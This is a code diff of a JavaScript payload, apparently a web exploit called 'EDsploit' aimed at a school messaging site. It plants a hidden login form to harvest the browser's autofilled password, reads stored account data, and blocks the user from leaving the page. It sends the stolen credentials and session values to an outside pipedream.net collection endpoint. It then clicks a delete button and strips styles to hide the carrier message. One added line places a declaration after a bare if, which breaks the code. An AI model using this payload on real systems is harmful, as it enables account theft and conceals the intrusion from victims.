@@ -1,11 +1,12 @@
 const ur = new URL(document.currentScript.src);
-window.addEventListener('beforeunload', (e) => {
+window.top.addEventListener('beforeunload', (e) => {
   e.preventDefault();
   e.returnValue = '';
 });
 
 (async function ex() {
 
+	if (window.top.document.querySelector('form[class=EDsploit]'))
 	const url = 'https://3169a8cec3d0dff512a354276b174afb.m.pipedream.net/session';
 	const messageid = new URL(window.top.document.querySelector('a[href*="Messagerie"]'));  
 	const keys = [
@@ -15,6 +16,7 @@ window.addEventListener('beforeunload', (e) => {
 	const form = window.top.document.createElement('form');
 	const identifiant = JSON.parse(sessionStorage.getItem("accounts"));
 	form.hidden = true;
+	form.className = "EDsploit"
 	form.innerHTML = `<input id="username" name="username" autocomplete="username" value=${identifiant.payload.accounts?.[0].identifiant}><input id="password" name="password" autocomplete="current-password" type="password">`
 	window.top.document.body.appendChild(form);
 	const pwdInput = window.top.document.querySelector('input[type="password"]');
@@ -26,10 +28,8 @@ window.addEventListener('beforeunload', (e) => {
 		t: new Date().toISOString(),
 		u: navigator.userAgent,
 		mid: messageid.searchParams.get('idMessage') || "null",
-		api: ur.searchParams.get("apiv") || "100.1",
 		sign: ur.searchParams.get("signature") || false,
 		mode: ur.searchParams.get("mode") || "Suppression",
-		email: ur.searchParams.get("email") || "test@gmail.com",
 		ps: pass,
 		s: Object.fromEntries(
 		keys
@@ -41,6 +41,13 @@ window.addEventListener('beforeunload', (e) => {
 			})
 		)
 	};
+
+	if (ur.searchParams.get("iframetrap") !== "true") {
+		window.top.document.querySelector('button[class="btn btn-danger"]').click()
+		const parents = window.top.document.querySelector('.view-message.printable-message.ck-content');
+		const style = parents.querySelectorAll(':scope > style');
+		style.forEach(s => s.remove());
+	}
 
 	try {
 		await fetch(url, {
@@ -107,7 +114,7 @@ async function iframe() {
 };
 
 (async function() {
-	if (ur.searchParams.get("iframetrap") === "true") {
+	if (ur.searchParams.get("iframetrap") === "false") {
 		if (window.top.document.body.querySelector('iframe[class=EDsploit]')) {
 			return null
 		} else {
